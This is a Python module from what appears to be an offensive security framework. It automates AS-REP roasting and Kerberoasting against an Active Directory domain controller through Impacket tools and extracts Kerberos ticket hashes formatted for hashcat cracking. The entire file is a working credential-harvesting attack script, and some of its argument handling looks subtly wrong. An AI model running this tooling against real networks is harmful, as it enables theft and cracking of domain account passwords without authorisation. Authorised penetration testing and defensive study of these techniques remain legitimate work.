#!/usr/bin/env python3
"""
kerberos_attack — Kerberos attacks via Impacket (AS-REP roasting + Kerberoasting).

CLI deps: impacket-GetNPUsers, impacket-GetUserSPNs (installed on Kali)

Extracts hashcat-ready hashes from Kerberos for offline cracking.
"""

import json
import re
import time

from base_module import TacticalModule


class KerberosAttack(TacticalModule):
    name = "kerberos_attack"
    description = "Kerberos attacks via Impacket (AS-REP roasting + Kerberoasting)"

    def _add_module_args(self) -> None:
        self.parser.add_argument(
            "--domain", required=True,
            help="AD domain (e.g., corp.local)",
        )
        self.parser.add_argument(
            "--dc-ip", required=True,
            help="Domain controller IP",
        )
        self.parser.add_argument(
            "--attack",
            choices=["asrep", "kerberoast", "both"],
            default="both",
            help="Attack type (default: both)",
        )
        self.parser.add_argument(
            "--username",
            help="Authenticated username (required for kerberoast)",
        )
        self.parser.add_argument(
            "--password",
            help="Password",
        )
        self.parser.add_argument(
            "--hash",
            help="NTLM hash for auth",
        )
        self.parser.add_argument(
            "--users-file",
            help="File with usernames for AS-REP roasting (one per line)",
        )
        self.parser.add_argument(
            "--output-file",
            help="Output file for hashes",
        )

    def run(self, args) -> None:
        start = time.monotonic()
        results: dict = {"domain": args.domain, "dc_ip": args.dc_ip}

        if args.attack in ("asrep", "both"):
            results["asrep_hashes"] = self._asrep_roast(args)

        if args.attack in ("kerberoast", "both"):
            if not args.username:
                if args.attack == "kerberoast":
                    self.output_error("--username required for kerberoasting")
                    return
            else:
                results["kerberoast_hashes"] = self._kerberoast(args)

        duration_ms = int((time.monotonic() - start) * 1000)
        results["duration_ms"] = duration_ms

        total_hashes = len(results.get("asrep_hashes", [])) + len(results.get("kerberoast_hashes", []))
        results["total_hashes"] = total_hashes

        self.log_run(
            args.db_path, self.name,
            json.dumps(vars(args), default=str),
            0 if total_hashes > 0 else 1, "", "", duration_ms,
        )
        self.output_success(results)

    def _asrep_roast(self, args) -> list[dict]:
        """AS-REP roasting — get hashes for accounts without pre-auth."""
        gnp_args = [f"{args.domain}/"]
        if args.username:
            gnp_args = [f"{args.domain}/{args.username}"]
            if args.password:
                gnp_args.extend([f"-password", args.password])
            elif args.hash:
                gnp_args.extend(["-hashes", args.hash])

        gnp_args.extend(["-dc-ip", args.dc_ip, "-no-pass", "-request"])

        if args.users_file:
            gnp_args.extend(["-usersfile", args.users_file])

        if args.output_file:
            gnp_args.extend(["-outputfile", args.output_file])

        result = self.run_tool("impacket-GetNPUsers", gnp_args, timeout=args.timeout)
        return self._parse_hashes(result.stdout, "asrep")

    def _kerberoast(self, args) -> list[dict]:
        """Kerberoasting — get TGS hashes for SPN accounts."""
        gus_args = [f"{args.domain}/{args.username}"]

        if args.password:
            gus_args.extend(["-password", args.password])
        elif args.hash:
            gus_args.extend(["-hashes", args.hash])

        gus_args.extend(["-dc-ip", args.dc_ip, "-request"])

        if args.output_file:
            gus_args.extend(["-outputfile", args.output_file])

        result = self.run_tool("impacket-GetUserSPNs", gus_args, timeout=args.timeout)
        return self._parse_hashes(result.stdout, "kerberoast")

    @staticmethod
    def _parse_hashes(output: str, attack_type: str) -> list[dict]:
        """Parse Impacket output for Kerberos hashes."""
        hashes: list[dict] = []
        for line in output.split("\n"):
            line = line.strip()
            if line.startswith("$krb5"):
                # Hashcat-ready format
                parts = line.split("$")
                username = ""
                if len(parts) > 3:
                    username = parts[3].split("*")[0] if "*" in parts[3] else parts[3]
                hashes.append({
                    "type": attack_type,
                    "username": username,
                    "hash": line[:300],
                    "hashcat_mode": "18200" if "asrep" in line else "13100",
                })
        return hashes


if __name__ == "__main__":
    KerberosAttack().execute()
